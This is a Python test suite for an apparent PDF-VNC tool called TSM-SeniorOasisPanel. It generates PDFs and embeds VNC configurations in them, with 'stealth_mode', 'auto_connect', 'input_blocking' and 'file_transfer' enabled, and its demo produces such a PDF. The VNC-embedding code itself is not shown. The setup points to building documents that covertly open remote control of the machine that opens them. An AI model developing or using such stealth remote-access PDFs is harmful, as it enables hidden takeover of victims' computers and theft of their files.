#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel PDF-VNC Integration Test Suite
Comprehensive testing for PDF generation and VNC integration
"""

import os
import sys
import tempfile
import time
import json
from datetime import datetime

def test_pdf_generator():
    """Test PDF generator functionality"""
    print("🧪 Testing PDF Generator...")
    
    try:
        from TSM_PDFGenerator import TSMPDFGenerator
        
        generator = TSMPDFGenerator()
        
        # Test code
        test_code = '''#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Test Code
"""

def hello_world():
    """Test function"""
    print("Hello, TSM-SeniorOasisPanel!")
    return "Success"

if __name__ == "__main__":
    result = hello_world()
    print(f"Result: {result}")
'''
        
        # Test basic PDF generation
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as temp_pdf:
            temp_pdf_path = temp_pdf.name
        
        success, message = generator.generate_pdf_with_code(
            test_code, "Python", temp_pdf_path, "Test PDF"
        )
        
        if success:
            print("✅ PDF generation test passed")
            if os.path.exists(temp_pdf_path):
                file_size = os.path.getsize(temp_pdf_path)
                print(f"   Generated PDF: {file_size} bytes")
                os.remove(temp_pdf_path)
            return True
        else:
            print(f"❌ PDF generation test failed: {message}")
            return False
            
    except Exception as e:
        print(f"❌ PDF generator test error: {e}")
        return False

def test_pdf_vnc():
    """Test PDF-VNC integration"""
    print("🧪 Testing PDF-VNC Integration...")
    
    try:
        from TSM_PDFVNC import TSMPDFVNC
        
        pdf_vnc = TSMPDFVNC()
        
        # Test VNC configuration
        vnc_config = {
            'host': 'localhost',
            'port': 5900,
            'web_port': 8080,
            'auto_connect': True,
            'stealth_mode': True,
            'input_blocking': True,
            'screen_sharing': True,
            'file_transfer': True,
            'timestamp': datetime.now().isoformat()
        }
        
        # Create test PDF first
        from TSM_PDFGenerator import TSMPDFGenerator
        generator = TSMPDFGenerator()
        
        test_code = '''
def vnc_test():
    """VNC test function"""
    print("VNC integration test")
    return "VNC Ready"
'''
        
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as temp_pdf:
            temp_pdf_path = temp_pdf.name
        
        # Generate base PDF
        success, message = generator.generate_pdf_with_code(
            test_code, "Python", temp_pdf_path, "VNC Test PDF"
        )
        
        if not success:
            print(f"❌ Base PDF generation failed: {message}")
            return False
        
        # Test VNC embedding
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as vnc_pdf:
            vnc_pdf_path = vnc_pdf.name
        
        success, message = pdf_vnc.embed_vnc_in_pdf(
            temp_pdf_path, vnc_config, vnc_pdf_path
        )
        
        if success:
            print("✅ PDF-VNC embedding test passed")
            
            # Test VNC extraction
            success, extracted_config = pdf_vnc.extract_vnc_from_pdf(vnc_pdf_path)
            
            if success:
                print("✅ VNC extraction test passed")
                print(f"   Extracted config: {extracted_config.get('host', 'Unknown')}:{extracted_config.get('server_port', 'Unknown')}")
            else:
                print("❌ VNC extraction test failed")
                return False
            
            # Cleanup
            os.remove(temp_pdf_path)
            os.remove(vnc_pdf_path)
            return True
        else:
            print(f"❌ PDF-VNC embedding test failed: {message}")
            os.remove(temp_pdf_path)
            return False
            
    except Exception as e:
        print(f"❌ PDF-VNC test error: {e}")
        return False

def test_enhanced_client():
    """Test enhanced client functionality"""
    print("🧪 Testing Enhanced Client...")
    
    try:
        from TSM_SeniorOasisPanel_client_enhanced import TSMSeniorOasisPanelClientEnhanced
        
        client = TSMSeniorOasisPanelClientEnhanced()
        
        # Test PDF generator integration
        if hasattr(client, 'pdf_generator') and client.pdf_generator:
            print("✅ PDF generator integration test passed")
        else:
            print("❌ PDF generator integration test failed")
            return False
        
        # Test PDF-VNC integration
        if hasattr(client, 'pdf_vnc') and client.pdf_vnc:
            print("✅ PDF-VNC integration test passed")
        else:
            print("❌ PDF-VNC integration test failed")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Enhanced client test error: {e}")
        return False

def test_complete_integration():
    """Test complete integration"""
    print("🧪 Testing Complete Integration...")
    
    try:
        from TSM_Complete_Integration import TSMCompleteIntegration
        
        integration = TSMCompleteIntegration()
        
        # Test initialization
        if integration.pdf_generator is None:
            integration.pdf_generator = None  # Will be initialized in start_all_services
        if integration.pdf_vnc_manager is None:
            integration.pdf_vnc_manager = None  # Will be initialized in start_all_services
        
        # Test status method
        status = integration.get_integration_status()
        
        if isinstance(status, dict) and 'pdf_generator' in status:
            print("✅ Complete integration test passed")
            return True
        else:
            print("❌ Complete integration test failed")
            return False
            
    except Exception as e:
        print(f"❌ Complete integration test error: {e}")
        return False

def test_latex_availability():
    """Test LaTeX availability"""
    print("🧪 Testing LaTeX Availability...")
    
    try:
        import subprocess
        
        # Test pdflatex availability
        result = subprocess.run(['pdflatex', '--version'], 
                              capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            print("✅ LaTeX (pdflatex) is available")
            print(f"   Version: {result.stdout.split()[0] if result.stdout else 'Unknown'}")
            return True
        else:
            print("❌ LaTeX (pdflatex) not available")
            print("   Please install a LaTeX distribution (TeX Live, MiKTeX, or MacTeX)")
            return False
            
    except FileNotFoundError:
        print("❌ LaTeX (pdflatex) not found in PATH")
        print("   Please install a LaTeX distribution and ensure pdflatex is in PATH")
        return False
    except subprocess.TimeoutExpired:
        print("❌ LaTeX test timed out")
        return False
    except Exception as e:
        print(f"❌ LaTeX test error: {e}")
        return False

def test_dependencies():
    """Test required dependencies"""
    print("🧪 Testing Dependencies...")
    
    dependencies = [
        ('PIL', 'Pillow'),
        ('numpy', 'numpy'),
        ('requests', 'requests'),
        ('json', 'json'),
        ('base64', 'base64'),
        ('zlib', 'zlib'),
        ('threading', 'threading'),
        ('tempfile', 'tempfile'),
        ('subprocess', 'subprocess'),
        ('os', 'os'),
        ('sys', 'sys'),
        ('datetime', 'datetime'),
        ('time', 'time')
    ]
    
    failed_deps = []
    
    for module_name, package_name in dependencies:
        try:
            __import__(module_name)
            print(f"✅ {package_name} available")
        except ImportError:
            print(f"❌ {package_name} not available")
            failed_deps.append(package_name)
    
    if failed_deps:
        print(f"\n❌ Missing dependencies: {', '.join(failed_deps)}")
        print("   Please install missing packages using: pip install -r requirements_pdf_vnc.txt")
        return False
    else:
        print("✅ All dependencies available")
        return True

def test_file_operations():
    """Test file operations"""
    print("🧪 Testing File Operations...")
    
    try:
        # Test temporary file creation
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_path = temp_file.name
            temp_file.write(b"test data")
        
        # Test file reading
        with open(temp_path, 'r') as f:
            content = f.read()
        
        if content == "test data":
            print("✅ File operations test passed")
            os.remove(temp_path)
            return True
        else:
            print("❌ File operations test failed")
            os.remove(temp_path)
            return False
            
    except Exception as e:
        print(f"❌ File operations test error: {e}")
        return False

def test_network_connectivity():
    """Test network connectivity"""
    print("🧪 Testing Network Connectivity...")
    
    try:
        import socket
        
        # Test localhost connectivity
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Test common VNC ports
        vnc_ports = [5900, 5901, 8080, 8081]
        available_ports = []
        
        for port in vnc_ports:
            try:
                result = sock.connect_ex(('localhost', port))
                if result == 0:
                    available_ports.append(port)
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
            except:
                pass
        
        sock.close()
        
        if available_ports:
            print(f"✅ Network connectivity test passed - Available ports: {available_ports}")
        else:
            print("✅ Network connectivity test passed - No VNC services running (expected)")
        
        return True
        
    except Exception as e:
        print(f"❌ Network connectivity test error: {e}")
        return False

def run_integration_demo():
    """Run integration demo"""
    print("🎯 Running Integration Demo...")
    
    try:
        from TSM_PDFGenerator import TSMPDFGenerator
        from TSM_PDFVNC import TSMPDFVNC
        
        # Create demo code
        demo_code = '''#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Integration Demo
"""

import os
import sys
from TSM_PDFGenerator import TSMPDFGenerator
from TSM_PDFVNC import TSMPDFVNC

def demo_function():
    """Demo function for PDF-VNC integration"""
    print("TSM-SeniorOasisPanel PDF-VNC Integration Demo")
    
    # Initialize components
    generator = TSMPDFGenerator()
    pdf_vnc = TSMPDFVNC()
    
    # Generate PDF
    code = "print('Hello, TSM-SeniorOasisPanel!')"
    success, message = generator.generate_pdf_with_code(
        code, "Python", "demo.pdf", "TSM Demo"
    )
    
    if success:
        print("PDF generated successfully!")
        
        # Embed VNC configuration
        vnc_config = {
            'host': 'localhost',
            'port': 5900,
            'web_port': 8080,
            'auto_connect': True,
            'stealth_mode': True
        }
        
        success, message = pdf_vnc.embed_vnc_in_pdf(
            "demo.pdf", vnc_config, "demo_vnc.pdf"
        )
        
        if success:
            print("PDF with VNC capabilities created!")
        else:
            print(f"VNC embedding failed: {message}")
    else:
        print(f"PDF generation failed: {message}")

if __name__ == "__main__":
    demo_function()
'''
        
        # Generate demo PDF
        generator = TSMPDFGenerator()
        success, message = generator.generate_pdf_with_code(
            demo_code, "Python", "integration_demo.pdf", "TSM Integration Demo"
        )
        
        if success:
            print("✅ Integration demo PDF created: integration_demo.pdf")
            
            # Create VNC-enabled version
            pdf_vnc = TSMPDFVNC()
            vnc_config = {
                'host': 'localhost',
                'port': 5900,
                'web_port': 8080,
                'auto_connect': True,
                'stealth_mode': True,
                'input_blocking': True,
                'screen_sharing': True,
                'file_transfer': True
            }
            
            success, message = pdf_vnc.embed_vnc_in_pdf(
                "integration_demo.pdf", vnc_config, "integration_demo_vnc.pdf"
            )
            
            if success:
                print("✅ Integration demo PDF with VNC created: integration_demo_vnc.pdf")
                return True
            else:
                print(f"❌ VNC embedding failed: {message}")
                return False
        else:
            print(f"❌ Demo PDF generation failed: {message}")
            return False
            
    except Exception as e:
        print(f"❌ Integration demo error: {e}")
        return False

def main():
    """Main test function"""
    print("🎯 TSM-SeniorOasisPanel PDF-VNC Integration Test Suite")
    print("=" * 60)
    print(f"Test started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    tests = [
        ("Dependencies", test_dependencies),
        ("LaTeX Availability", test_latex_availability),
        ("File Operations", test_file_operations),
        ("Network Connectivity", test_network_connectivity),
        ("PDF Generator", test_pdf_generator),
        ("PDF-VNC Integration", test_pdf_vnc),
        ("Enhanced Client", test_enhanced_client),
        ("Complete Integration", test_complete_integration),
        ("Integration Demo", run_integration_demo)
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{'='*20} {test_name} {'='*20}")
        try:
            if test_func():
                passed += 1
        except Exception as e:
            print(f"❌ {test_name} test crashed: {e}")
    
    print("\n" + "="*60)
    print(f"Test Results: {passed}/{total} tests passed ({passed/total*100:.1f}%)")
    print(f"Test completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    if passed == total:
        print("🎉 All tests passed! TSM-SeniorOasisPanel PDF-VNC Integration is ready!")
    elif passed >= total * 0.8:
        print("⚠️  Most tests passed. Some features may not work correctly.")
    else:
        print("❌ Many tests failed. Please check your installation and dependencies.")
    
    print("\n📋 Test Summary:")
    print("- PDF Generator: LaTeX-based PDF generation with syntax highlighting")
    print("- PDF-VNC Integration: VNC configuration embedding and extraction")
    print("- Enhanced Client: GUI and command-line interfaces")
    print("- Complete Integration: Full system integration")
    print("- Dependencies: Required Python packages and system tools")
    
    return passed == total

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
